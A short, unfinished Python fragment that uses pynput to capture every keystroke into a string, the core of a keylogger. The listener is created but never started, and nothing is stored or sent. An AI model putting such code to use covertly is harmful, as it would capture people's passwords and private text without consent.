from pynput import keyboard
import logging
import time
keystrokes = ""

def on_press(key):
    global keystrokes
    try:
        if key == keyboard.Key.enter:
            keystrokes += "\n"
        elif key == keyboard.Key.tab:
            keystrokes += "\t"
        elif key == keyboard.Key.space:
            keystrokes += " "
        else:
            keystrokes += str(key).strip("'")
    except Exception:
        logging.error("Error in on_press")
            
keyboardListener = keyboard.Listener(
    on_press=on_press)